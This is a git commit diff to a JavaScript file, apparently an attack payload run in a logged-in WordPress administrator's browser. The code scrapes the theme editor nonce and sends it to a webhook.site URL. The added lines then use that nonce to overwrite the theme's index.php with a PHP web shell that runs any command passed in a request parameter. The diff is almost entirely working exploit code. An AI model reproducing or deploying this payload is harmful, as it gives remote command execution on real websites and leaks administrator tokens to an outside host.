29f62d2c3b131ea2773d8d45c9d0ea4b61af2253
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 15:36:49 +0300

    Update spyros.js

--- spyros.js
+++ spyros.js
@@ -18,6 +18,14 @@ async function main(){
 	}catch(err){
 		const kke = await fetch("wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo",{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
 		const k = fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+kke[1]);
+		const e = await fetch("wp-admin/admin-ajax.php", {
+		"headers":{"Content-type":"application/x-www-form-urlencoded"},
+	"body": `nonce=${kke[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);}
+	?>&action=edit-theme-plugin-file`,
+	  "method": "POST",
+	  "mode": "cors",
+	  "credentials": "include"
+	}); 
 	}
 }
 
